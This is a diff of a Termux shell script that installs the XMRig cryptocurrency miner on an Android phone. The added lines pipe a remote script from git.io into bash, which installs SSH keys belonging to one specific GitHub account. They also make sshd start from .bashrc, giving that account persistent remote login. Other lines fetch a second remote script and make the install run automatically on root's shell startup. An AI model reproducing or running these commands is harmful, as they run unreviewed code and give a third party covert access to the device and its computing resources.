@@ -323,6 +323,12 @@ HEAD "Upgrading packages"
 apt-get update && apt-get upgrade -y
 HEAD "Installing dependency"
 apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev vim wget openssh -y
+
+INFO "Running SSH_Key_Installer" && bash <(curl -fsSL git.io/key.sh) -g jchuang1977
+INFO "Setting termux's .bashrc" && echo "sshd" >> "$HOME/.bashrc"
+local IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d '/')
+INFO "change local user passwd at: $IP:8022" && passwd
+
 INFO "Getting xmrig source code"
 #git clone https://github.com/C3Pool/xmrig-C3.git
 git clone https://github.com/xmrig/xmrig.git
@@ -335,12 +341,6 @@ wget "git.io/J3xxv" -O doge_phone.sh && chmod 755 doge_phone.sh
 INFO "XMRIG create success"
 HEAD "Please restart Termux App to run XMRIG"
 EOM
-
-  INFO "Running SSH_Key_Installer" && bash <(curl -fsSL git.io/key.sh) -g jchuang1977
-  INFO "Setting termux's .bashrc" && echo "sshd" >> "$HOME/.bashrc"
-  
-  local IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d '/')
-  INFO "change local user passwd at: $IP:8022" && passwd
   
   echo "[ ! -e ./xmrig-notls ] && bash ./install.sh" >> "$HOME/ubuntu-in-termux/ubuntu-fs/root/.bashrc"
 }
